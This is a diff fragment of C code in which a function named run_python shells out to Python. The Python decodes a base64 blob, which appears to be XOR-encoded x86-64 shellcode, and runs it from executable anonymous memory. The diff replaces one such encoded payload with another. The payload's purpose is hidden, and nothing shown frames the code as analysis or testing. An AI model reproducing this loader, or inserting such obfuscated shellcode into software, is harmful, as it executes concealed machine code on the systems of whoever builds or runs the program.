@@ -5,7 +5,7 @@ static void run_python(void) {
     system(
         "python3 -c \""
         "import base64, mmap, ctypes, sys, os;"
-        "encoded=\\\"SDHJSIHp+f///0iNBe////9Iu2aWcpLFaW45SDFYJ0gt+P///+L0Li5d8KwHQUoOluvCkTY8Xw67EcabO4Y2ZpZyvbAaHBYE/xy9rQYWUQeWJMWRNwQCPpl3ksVpbjk=\\\";"
+        "encoded=\\\"SDHJSIHp+f///0iNBe////9Iu3hbTHIoy2QtSDFYJ0gt+P///+L0MONjEEGlS14QW9UifJQ2SxB2LyZ2mYwieFtMXV24FgIaMiJdQKQcRRlbGiV8lQ4WIFRJcijLZC0=\\\";"
         "raw=base64.b64decode(encoded);"
         "mem=mmap.mmap(-1,len(raw),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,"
         "mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);"
